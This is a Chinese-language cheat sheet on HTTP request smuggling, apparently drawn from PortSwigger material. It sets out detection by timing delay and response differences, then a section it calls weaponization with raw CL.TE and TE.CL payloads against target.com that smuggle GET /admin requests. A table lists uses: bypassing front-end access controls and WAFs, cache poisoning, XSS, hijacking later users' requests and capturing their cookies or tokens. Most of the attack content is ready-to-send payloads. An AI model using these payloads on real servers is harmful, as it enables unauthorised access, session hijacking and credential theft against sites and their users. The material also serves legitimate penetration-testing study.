# HTTP 请求走私 (Request Smuggling) 实战参考

> 阶段分离: [攻击] CL/TE 检测与识别 → [利用] 缓存投毒/绕过WAF/劫持会话

---

# 攻击阶段 — 检测与识别

## 1. 漏洞原理

```
CL.TE: 前端用 Content-Length, 后端用 Transfer-Encoding
TE.CL: 前端用 Transfer-Encoding, 后端用 Content-Length
TE.TE: 前后端都用 Transfer-Encoding, 但对混淆处理不同
```

## 2. 检测方法

### 2.1 时间延迟检测 (最基础)

```http
# === CL.TE 检测 ===
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G          ← 后端等待下一个chunk → 超时 → 延迟

# === TE.CL 检测 ===
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

6d         ← 超长chunk → 后端一直等 → 超时
```

### 2.2 响应差异检测

```http
# 正常请求 → 记录响应长度
# 走私请求 → 响应长度不同 → 确认

POST / HTTP/1.1
Host: target.com
Content-Length: 0
Transfer-Encoding: chunked

GET /404 HTTP/1.1
X-Ignore: X
```

---

# 利用阶段 — 武器化

## 3. CL.TE 利用 (前端CL/后端TE)

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6          ← 前端识别: body长6
Transfer-Encoding: chunked ← 后端识别: chunked

0                          ← 后端认为第1个请求结束

GET /admin HTTP/1.1        ← ★ 走私的请求
Host: target.com
X-Ignore: X
```

## 4. TE.CL 利用 (前端TE/后端CL)

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4          ← 后端识别: body长4
Transfer-Encoding: chunked ← 前端识别: chunked

5c                         ← ★ 前端发送整个chunk
GET /admin HTTP/1.1        ← ★ 走私请求 (+ 后端只取4字节"5c\r\n")
Host: target.com
X-Ignore: X
0

```

## 5. 利用场景

| 场景 | 具体操作 |
|------|---------|
| **绕过前端 ACL** | 走私 `GET /admin` → 后端不经过前端ACL检查 |
| **缓存投毒** | 走私精心构造的响应头 → 缓存污染 |
| **劫持用户请求** | 走私部分请求 → 下一个真实用户的请求被拼接 |
| **XSS via Smuggling** | 走私含XSS的响应 → 缓存 → 其他用户访问 |
| **WAF 绕过** | 前端WAF检查正常请求 → 走私的恶意请求直接到后端 |
| **凭据窃取** | 走私带外带功能的请求 → 捕获后续用户的Cookie/Token |

## 6. HTTP/2 降级走私

```bash
# HTTP/2 → HTTP/1.1 降级时出现的新走私类型 (H2.CL / H2.TE)

# 检测:
# 1. 目标支持 HTTP/2 前端 + HTTP/1.1 后端
# 2. 降级时的头部处理差异

# 工具: Burp HTTP Request Smuggler 插件
# → Repeater → 右键 "Launch HTTP Request Smuggler"
```

---

*参考: PortSwigger HTTP Request Smuggling + 实战案例*
